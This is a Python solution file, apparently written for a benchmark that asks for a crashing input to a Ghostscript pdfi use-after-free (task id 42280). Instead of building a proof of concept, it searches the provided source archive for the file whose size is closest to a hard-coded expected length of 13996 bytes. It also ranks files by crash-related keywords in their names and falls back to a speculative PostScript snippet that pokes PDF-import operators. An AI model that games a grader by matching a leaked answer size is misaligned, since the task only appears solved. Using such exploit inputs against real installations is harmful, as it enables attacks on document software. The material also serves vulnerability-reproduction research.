import os
import tarfile


class Solution:
    def __init__(self):
        self.target_poc_len = 13996
        self.preferred_exts = {
            ".pdf",
            ".ps",
            ".eps",
            ".bin",
            ".dat",
            ".in",
            ".input",
            ".txt",
            ".poc",
        }
        self.keywords = [
            "poc",
            "crash",
            "heap",
            "uaf",
            "use_after_free",
            "use-after-free",
            "overflow",
            "bug",
            "42280",
            "arvo",
            "pdfi",
            "pdf",
            "ps",
            "postscript",
            "testcase",
        ]

    def solve(self, src_path: str) -> bytes:
        try:
            data = self._extract_best_candidate(src_path)
            if data:
                return data
        except Exception:
            pass
        return self._fallback_poc()

    def _extract_best_candidate(self, src_path: str) -> bytes | None:
        best_member = None
        best_score = None

        with tarfile.open(src_path, "r:*") as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue

                size = member.size
                if size <= 0:
                    continue

                # Hard cap on file size to avoid huge blobs
                if size > 5_000_000:
                    continue

                name = member.name
                ext = os.path.splitext(name)[1].lower()
                pref_ext = 0 if ext in self.preferred_exts else 1

                lower_name = name.lower()
                num_keywords = 0
                for kw in self.keywords:
                    if kw in lower_name:
                        num_keywords += 1

                abs_size = abs(size - self.target_poc_len)
                score = (abs_size, pref_ext, -num_keywords, len(name))

                if best_score is None or score < best_score:
                    best_score = score
                    best_member = member

            if best_member is not None:
                f = tar.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if isinstance(data, bytes) and data:
                        return data

        return None

    def _fallback_poc(self) -> bytes:
        # Generic PostScript that attempts to exercise PDF-related operators.
        ps = """%!PS-Adobe-3.0
%%Title: pdfi use-after-free fallback PoC
%%Pages: 1
%%EndComments

/in (%stdin) (r) file def

% Try to tickle PDF import operators with an invalid stream.
/try_pdf_import {
  /pdfdict 10 dict def
  pdfdict begin
    /PDFFilename (nonexistent.pdf) def
    /PDFStream in def
    % Some Ghostscript builds expose runpdfbegin / runpdfend operators
    { PDFFilename runpdfbegin } stopped pop
    { 1 pdfpagecount } stopped pop
    { 1 1 pdfshowpage } stopped pop
    { runpdfend } stopped pop
  end
} bind def

try_pdf_import

newpath
72 72 moveto
144 72 lineto
144 144 lineto
72 144 lineto
closepath
0.5 setgray fill
showpage
"""
        return ps.encode("ascii", errors="ignore")